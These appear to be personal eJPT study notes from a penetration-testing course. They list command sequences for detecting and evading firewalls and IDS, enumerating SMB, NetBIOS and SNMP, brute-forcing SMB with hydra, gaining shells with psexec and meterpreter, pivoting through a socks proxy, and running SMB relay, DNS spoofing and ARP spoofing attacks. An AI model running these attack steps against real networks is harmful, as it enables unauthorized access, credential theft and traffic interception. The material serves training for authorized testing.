# # 08hakr's Short Notes eJPT
# 007 INE-Host-and-Network-Penetration-Testing-Network-Based-Attacks-Course-File

## Firewall Detection
- nmap -Pn -sV -F -sS <target-ip>
if the ports are filtered instend of Closed then we can say no firewall
- nmap -Pn -sV -F -sA -p<open-ports> <target-ip>  here if the openports are said to be filtered then there is a firewall
## IDS detection
- nmap -Pn -sS -sV -F -f <target-ip> (fragmentation)
- nmap -Pn -sS -sV -F -f --mtu 32  <target-ip> (fragmentation)
- nmap -Pn -sS -sV -F -f --data-length 200 -D <decoy-ip-Gateway-ip> <target-ip>
- nmap -Pn -sS -sV -F -f --data-length 200 -g 53 -D <decoy-ip-Gateway-ip> <target-ip> (we-are-making the request that it coming from port 53)nmap -Pn -sS -sV -F -f --data-length 200 -D <decoy-ip-Gateway-ip> <target-ip>

## Service Enumeration
### SMB and NetBIOS Enumeration (Repeat with proxy chaining)
- scan the open ports then move scan the versions then scan with scripts. find the users with enum users module then brute force the passwords with users which are found find shares and connect to the server with psexec
- nmap <target-ip1>
- nbtscan <target-ip1>
- nbtscan <target-ip1>/24
- nblookup -A <target-ip1>
- nmap -sU -p137 <target-ip1>
- nmap -sU -sv -T4 --script=nbstat.nse -p137 -Pn -n <target-ip1>
- nmap -sV -p139,445 <target-ip1>
- SMB- nmap -p445 --script smb-protocols <target-ip1>
- nmap -p445 --script smb-security-mode <target-ip1>
- smbclient -L <target-ip1> /share details
- nmap -445 --script smb-enum-users <target-ip1>
- hydra -L users.txt -P unix_passwords.txt <target-ip1> smb
- psexec administrator@<target-ip1>
- OR metasploit module of psexec
- if doesnt work then switch to the 64 bit meterpreter payload]

- run autoroute -s <target-ip-subnet>/24
- cat /etc/proxychains4.conf
- search socks
- use server/socks_proxy
- set version 4a
- set srvport 9050
- run
- netstat -antp

- proxychains nmap <target-ip2> -sT -Pn -sV -p445

- previous target session- shell
- net view <target-ip2>
- migrate -N ecplorer.exe
- net view <target-ip2>
### Mapping the share to allows us to view the content of the that drives
- net use D: \\<target-ip2>\Documents
- net use K: \\<target-ip2>\K$
- dir D:
- dir K:


### SNMP Enumeration
- 161, 162 its a UDP port
- nmap -sU -p161 <target-ip>
- ls -al /usr/share/nmap/nselib/data/ | grep snmp (snmpcommunities.lst)
- nmap -sU -p161 --script=snmp-brute <target-ip>
- snmpwalk -v 1 -c public <target-ip>
- nmap -sU -p 161 --script snmp-* <target-ip> > snmp_info
- find SMB credential with hydra
- then login with psexec



## SMB Relay Attack
- msfconsole
- set srvhost <attacker-ip>
- set lhost <attacker-ip>
- set smbhost <target-smb-host-ip>
### DNS Spoofing
- echo "<attacker-ip> *.sportsfoo.com" > dns
- dnsspoof -i eth1 -f dns
-
### ip forwarding on
- echo 1 > /proc/sys/net/ipv4/ip_forward
- arpspoof -i eth1 -t <target-client-ip> <gatway>
- arpspoof -i eth1 -t <gatway> <target-client-ip>
